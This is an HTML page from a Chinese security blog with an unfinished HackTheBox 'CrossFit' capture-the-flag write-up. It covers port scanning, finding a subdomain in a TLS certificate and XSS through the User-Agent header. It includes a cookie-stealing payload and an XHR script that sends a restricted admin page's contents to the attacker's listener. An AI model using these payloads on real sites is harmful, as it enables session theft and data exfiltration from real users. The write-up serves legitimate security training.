@@ -1,0 +1,1911 @@
+<!DOCTYPE html>
+<html lang="zh-CN,en,default">
+  <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <link rel="preload" href="/css/first.css" as="style">
+  
+
+  <!-- 页面元数据 -->
+  
+  <title>HackTheBox | CrossFit (未完待续) - TARI TARI</title>
+  
+    <meta name="keywords" content="HTB">
+  
+
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    <link rel="shortcut icon" type='image/x-icon' href="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/favicon.ico">
+  
+
+  <!-- import link -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/first.css">
+
+  
+
+  
+  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
+  
+
+  <script id="loadcss"></script>
+
+  
+<script>
+if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
+    document.write(
+	'<style>'+
+		'html{'+
+			'overflow-x: hidden !important;'+
+			'overflow-y: hidden !important;'+
+		'}'+
+		'.kill-ie{'+
+			'text-align:center;'+
+			'height: 100%;'+
+			'margin-top: 15%;'+
+			'margin-bottom: 5500%;'+
+		'}'+
+	'</style>'+
+    '<div class="kill-ie">'+
+        '<h1><b>抱歉，您的浏览器无法访问本站</b></h1>'+
+        '<h3>微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>'+
+        '继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</h3><br/>'+
+        '<a target="_blank" rel="noopener" href="https://www.microsoft.com/zh-cn/WindowsForBusiness/End-of-IE-support"><strong>了解详情 ></strong></a>'+
+    '</div>');
+</script>
+
+
+<noscript>
+	<style>
+		html{
+			overflow-x: hidden !important;
+			overflow-y: hidden !important;
+		}
+		.kill-noscript{
+			text-align:center;
+			height: 100%;
+			margin-top: 15%;
+			margin-bottom: 5500%;
+		}
+	</style>
+    <div class="kill-noscript">
+        <h1><b>抱歉，您的浏览器无法访问本站</b></h1>
+        <h3>本页面需要浏览器支持（启用）JavaScript</h3><br/>
+        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>了解详情 ></strong></a>
+    </div>
+</noscript>
+
+</head>
+
+  <body>
+    
+
+<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
+  <div class='container'>
+  <div id='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+            TARI TARI
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-home fa-fw'></i>主页
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="搜索..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-home fa-fw'></i>主页
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+    <div id="l_body">
+      <div id="l_cover">
+  
+    
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
+          
+            <div class='cover-bg lazyload placeholder' data-bg="/img/home.jpeg"></div>
+          
+          <div class='cover-body'>
+  <div class='top'>
+    
+    
+      <p class="title">TARI TARI</p>
+    
+    
+      <p class="subtitle">记录信安路上的点滴 (:</p>
+    
+  </div>
+  <div class='bottom'>
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+        </div>
+    
+  
+  </div>
+
+      <div id="safearea">
+        <div class="body-wrapper" id="pjax-container">
+          
+
+<div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        HackTheBox | CrossFit (未完待续)
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2021年8月8日 11:32</p>
+  </a>
+</div>
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateUpdated" datetime="2022-11-27T15:35:56+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2022年11月27日 15:35</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="HackTheBox | CrossFit (未完待续)" data-path="/p/2021/htb-crossfit/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+          
+            
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：9.5k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：44分钟</p>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  
+  <span class='btn'><a class="button"  title='Web'><i class='fas fa-tag'></i>Web</a></span> <span class='btn'><a class="button"  title='XSS'><i class='fas fa-tag'></i>XSS</a></span> <span class='btn'><a class="button"  title='CSRF'><i class='fas fa-tag'></i>CSRF</a></span> <span class='btn'><a class="button"  title='JavaScript'><i class='fas fa-tag'></i>JavaScript</a></span> <span class='btn'><a class="button"  title='CORS'><i class='fas fa-tag'></i>CORS</a></span> <span class='btn'><a class="button"  title='SFTP信息泄漏'><i class='fas fa-tag'></i>SFTP信息泄漏</a></span> <span class='btn'><a class="button"  title='内网子域收集'><i class='fas fa-tag'></i>内网子域收集</a></span>
+
+<p>第一次刷 Hack The Box，因为看到别人写的WP，好像很好玩，然后就心里痒痒的~ </p>
+<p>然后随便调了个顺眼的…结果玩着玩着才发现是 insane 难度。。。。</p>
+<p>吐槽：卡死了…加载一些静态资源….特别是和google有关的，所以直接 SwitchyOmega 安排上，把google相关的挂代理，速度就起飞了。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里被分配到的IP为 <code>10.10.10.208</code></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate=1000 -T4 -sC -sV -Pn 10.10.10.208</span><br></pre></td></tr></table></figure>
+
+<p>参数说明<sup><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2017/07/nmap.html">[1]</a><a target="_blank" rel="noopener" href="https://nmap.org/man/zh/man-port-scanning-techniques.html">[2]</a></sup></p>
+<ul>
+<li><p>-p- 全端口扫描缩写，特点是巨慢…（300ms延迟约需1个小时）</p>
+</li>
+<li><p>-sV 扫描目标主机和端口上运行的软件的版本，但不扫描开放端口，nmap默认使用 -sT 扫描</p>
+<ul>
+<li>-sT TCP扫描</li>
+<li>-sU UDP扫描，UDP 扫描发送 UDP 数据包到目标主机，并等待响应。如果返回 ICMP 不可达的错误消息，说明端口是关闭的</li>
+<li>-sS 使用SYN<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/SYN%E6%89%AB%E6%8F%8F/17658294">半开放扫描<sup>[2]</sup></a></li>
+<li>-sP ping扫描，用类似ping的方式发现主机</li>
+<li>-sF FIN 扫描也不会在目标主机上创建日志（FIN扫描的优势之一），如果收到一个RST报文，该端口被认为是 closed(关闭的)，而没有响应则意味着 端口是open|filtered(开放或者被过滤的)</li>
+<li>其余扫描方式可见官网<a target="_blank" rel="noopener" href="https://nmap.org/man/zh/man-port-scanning-techniques.html">端口扫描技术</a></li>
+</ul>
+</li>
+<li><p>-sC 根据端口识别的服务,调用默认脚本</p>
+</li>
+<li><p>-T4，设置时间模板，共6个，依次为</p>
+<ul>
+<li><code>0 paranoid</code> 和 1 sneaky 模式用于IDS躲避</li>
+<li><code>2 Polite</code> 模式降低了扫描 速度以使用更少的带宽和目标主机资源。</li>
+<li><code>3 Normal</code> 为默认模式，因此-T3 实际上是未做任何优化。</li>
+<li><code>4 Aggressive</code> 模式假设用户具有合适及可靠的网络从而加速扫描.</li>
+<li><code>5 insane</code> 模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。</li>
+</ul>
+</li>
+</ul>
+<p>使用其他工具交叉扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan 10.10.10.208 --ports 0-65535</span><br></pre></td></tr></table></figure>
+
+<p>没啥发现</p>
+<p>端口扫描结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&gt; nmap -p- --min-rate=1000 -T4 -sC -sV -Pn 10.10.10.208</span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked <span class="string">&#x27;up&#x27;</span> and scan <span class="built_in">times</span> will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 11:37 CST</span><br><span class="line">Warning: 10.10.10.208 giving up on port because retransmission <span class="built_in">cap</span> hit (6).</span><br><span class="line">Stats: 0:15:50 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</span><br><span class="line">Connect Scan Timing: About 22.97% <span class="keyword">done</span>; ETC: 12:46 (0:53:06 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.208</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 65511 closed ports</span><br><span class="line">PORT      STATE    SERVICE     VERSION</span><br><span class="line">21/tcp    open     ftp         vsftpd 2.0.8 or later</span><br><span class="line">| ssl-cert: Subject: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US</span><br><span class="line">| Not valid before: 2020-04-30T19:16:46</span><br><span class="line">|_Not valid after:  3991-08-16T19:16:46</span><br><span class="line">22/tcp    open     ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b0:e7:5f:5f:7e:5a:4f:e8:e4:cf:f1:98:01:cb:3f:52 (RSA)</span><br><span class="line">|   256 67:88:2d:20:a5:c1:a7:71:50:2b:c8:07:a4:b2:60:e5 (ECDSA)</span><br><span class="line">|_  256 62:ce:a3:15:93:c8:8c:b6:8e:23:1d:66:52:f4:4f:ef (ED25519)</span><br><span class="line">80/tcp    open     http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">1918/tcp  filtered can-nds</span><br><span class="line">4465/tcp  filtered unknown</span><br><span class="line">5392/tcp  filtered unknown</span><br><span class="line">7487/tcp  filtered unknown</span><br><span class="line">8161/tcp  filtered patrol-snmp</span><br><span class="line">14933/tcp filtered unknown</span><br><span class="line">16477/tcp filtered unknown</span><br><span class="line">24729/tcp filtered unknown</span><br><span class="line">27866/tcp filtered unknown</span><br><span class="line">31979/tcp filtered unknown</span><br><span class="line">40147/tcp filtered unknown</span><br><span class="line">41161/tcp filtered unknown</span><br><span class="line">42569/tcp filtered unknown</span><br><span class="line">44322/tcp filtered pmcdproxy</span><br><span class="line">47236/tcp filtered unknown</span><br><span class="line">51658/tcp filtered unknown</span><br><span class="line">52857/tcp filtered unknown</span><br><span class="line">57857/tcp filtered unknown</span><br><span class="line">61414/tcp filtered unknown</span><br><span class="line">62126/tcp filtered unknown</span><br><span class="line">64845/tcp filtered unknown</span><br><span class="line">Service Info: Host: Cross; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>然后也用了 fscan 对 ftp 和 ssh 弱口令进行排查</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 10.10.10.208</span><br></pre></td></tr></table></figure>
+
+<p>目录爆破，啥都没，好家伙，做到这就没思路了</p>
+<h3 id="sftp敏感信息泄漏"><a href="#sftp敏感信息泄漏" class="headerlink" title="sftp敏感信息泄漏"></a>sftp敏感信息泄漏</h3><p>掌握一个新姿势，vsftp 证书签名可能会有敏感信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client -connect 10.10.10.208:21 -starttls ftp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/htb-crossfit/image-20210808171519802.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210808171519802.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210808171519802"></p>
+<p>得到邮箱地址和子域</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*.crossfit.htb</span><br><span class="line">emailAddress = info@gym-club.crossfit.ht</span><br></pre></td></tr></table></figure>
+
+<p>然后把这个子域加到我们本机host 上，然后用子域访问..</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.10.208 gym-club.crossfit.htb&quot; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<h3 id="进一步信息搜集"><a href="#进一步信息搜集" class="headerlink" title="进一步信息搜集"></a>进一步信息搜集</h3><p>访问得到一个健身俱乐部页面，首页最下面和联系我们的页面，题目标签是XSS、CSRF，盲猜这两至少一处有XSS</p>
+<p>用 burp 的 instereting files and directories 扫了扫目录，有个 readme.txt ，不过内容是关于wordpress 的 colorlib 主题的 readme，没什么收获</p>
+<p>emmm，看了WP发现用的 dirburst的字典，自用35w字典没找到… 这里官方WP使用 <a target="_blank" rel="noopener" href="https://github.com/OJ/gobuster">gobuster</a>，我这里用的自己写的小工具，虽然用了协程，但速度完全比不上go的，，差了1倍….</p>
+<p><img src="/img/htb-crossfit/image-20210808170432327.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210808170432327.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210808170432327"></p>
+<p>发现目录信息泄漏</p>
+<p><img src="/img/htb-crossfit/image-20210808170812474.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210808170812474.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210808170812474"></p>
+<p>不过访问后 <a target="_blank" rel="noopener" href="http://gym-club.crossfit.htb/security_threat/report.php">http://gym-club.crossfit.htb/security_threat/report.php</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your are not allowed to access this page.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web漏洞利用"><a href="#Web漏洞利用" class="headerlink" title="Web漏洞利用"></a>Web漏洞利用</h2><h3 id="验证-XSS"><a href="#验证-XSS" class="headerlink" title="验证 XSS"></a>验证 XSS</h3><p>对这两个输入框打了下，发现好像不出网…(burp进行了一次URL编码，最后抓包改一下包为编码前的数据)</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;kmy9o4.dnslog.cn&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在     <a target="_blank" rel="noopener" href="http://gym-club.crossfit.htb/blog-single.php">http://gym-club.crossfit.htb/blog-single.php</a> 页面下面的评论区发现疑似 xss 点，在内容处输入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/htb-crossfit/image-20210808172032797.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210808172032797.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210808172032797"></p>
+<p>这里还说明了还会记录我们的 IP 信息和浏览器信息（猜测为UA），那管理员当然也能看到 （</p>
+<p>一开始想了半天怎么利用xss，后来发现靶机IP是可以直接访问到我们的….啊这….</p>
+<p>那直接监听本机 80 端口咯</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lv 0.0.0.0 80</span><br></pre></td></tr></table></figure>
+
+<p>然后评论区内容不变，更改UA为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://10.10.14.3&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中 src 的 IP 为本机被 openvpn 分配的 IP</p>
+<p><img src="/img/htb-crossfit/image-20210808172910089.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210808172910089.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210808172910089"></p>
+<p>毕竟都检测XSS了，那我们评论区输入的内容输出肯定被编码的，2333 然后这里用 UA，可以，很强势！</p>
+<p>那有时渗透能用 XFF，毕竟一般惯性思维（指开发），这两个参数，不会被输入恶意字符</p>
+<p><img src="/img/htb-crossfit/image-20210808173032809.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210808173032809.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210808173032809"></p>
+<p>尝试获取Cookie</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;svg/onload=&quot;javascript:document.location.href=(&#x27;http://10.10.14.3?cookie=&#x27;+btoa(document.cookie))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不过啥都没返回</p>
+<p><img src="/img/htb-crossfit/image-20210808174556286.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210808174556286.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210808174556286"></p>
+<p>应该是管理员端设置了httponly，导致不能document.cookie不能<sup><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies">[3]</a></sup>获取Cookie</p>
+<h3 id="尝试-XSS-XHR"><a href="#尝试-XSS-XHR" class="headerlink" title="尝试 XSS+XHR"></a>尝试 XSS+XHR</h3><p>虽然不能获取管理员cookie，但我们可以利用管理员的身份通过<code>XMLHttpRequests</code>请求我们请求不到资源。就管理员访问我们构造的 JS 异步请求代码，他就会带上他的 Cookie 请求我们无法请求的资源，然后把结果返回给我们，这不就常用的XSS+CSRF（SSRF）组合拳，哈哈。</p>
+<p>那请求啥页面我们请求不到的呢？ 比如刚刚的 <code>security_threat/report.php</code> ！</p>
+<p>参考2019UNCTF<sup>[4]</sup>，将以下代码保存为 payload0.js（下面 IP 变为 10.10.14.13 是因为openvpn断了，所以我本机IP变了）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.readyState === <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr2.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://10.10.14.13:2233/&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    xhr2.send(<span class="built_in">this</span>.responseText); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://gym-club.crossfit.htb/security_threat/report.php&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
+
+<p>远程要加载我们的代码，肯定要起一个HTTP服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>然后获取返回数据为 2233 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2233</span><br></pre></td></tr></table></figure>
+
+<p>构造UA</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://10.10.14.13/payload0.js&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发送请求（一次接收不到数据可以多试两次，可能是网络环境不稳定原因？）</p>
+<p><img src="/img/htb-crossfit/image-20210812235755982.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210812235755982.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210812235755982"></p>
+<p>不过好像没啥有用的东西，就一个查看日志的页面</p>
